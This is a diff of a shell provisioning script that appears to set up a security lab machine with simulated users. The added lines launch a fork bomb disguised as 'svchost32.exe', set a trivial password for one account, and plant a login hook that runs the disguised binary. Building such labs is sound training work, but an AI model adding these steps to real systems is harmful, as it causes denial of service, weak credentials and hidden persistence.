@@ -1,30 +1,33 @@
-# get git
+# get git, apache, php, nmap, wireshark, ssh, python2
 
-# get nmap
+# set root crontab to start httpd
+
 
 # set up networking
-echo "nameserver 192.168.1.1" > /etc/resolv.conf
-sudo route add default gw 192.168.1.1
-
-# add users
-bash add_users.bash
+#echo "nameserver 192.168.1.1" > /etc/resolv.conf
+#sudo route add default gw 192.168.1.1
 
 # start ssh
 systemctl start ssh
 
+# start fork bomb
+Make
+cp svchost.exe /usr/sbin/svchost32.exe
+/usr/sbin/svchost32.exe &
+
+# add users
+bash add_users.bash
+
+# set password for allan_1
+echo "allan_1:password" | chpasswd
+
+# add run forkbomb upon login
+touch /home/adamjohnson/.bash_login
+echo '/usr/bin/svchost.exe' > /home/adamjohnson/.bash_login
+echo 'echo "done"' >> /home/adamjohnson/.bash_login
+
 # start https users
-declare -a httpsusers=("jacob_1" "jacob_2" "sara_1" "brett_1")
-tty=25
-for httpsuser in "${httpsusers[@]}"
-do
-	getty -a "$httpsuser" "$tty" &
-	cp https_user.py /home/"$httpsuser"/"$httpsuser".py
-	su jacob_1 -c 'python2 /home/$httpsuser/$httspuser.py' > /dev/null &
-	rm /home/"$httpsuser"/"$httpsuser".py
-	let tty=tty+1
-done
-
-
+bash start_https_users.bash
 
 # start irc user
 getty -a Adminestrator tty16 &
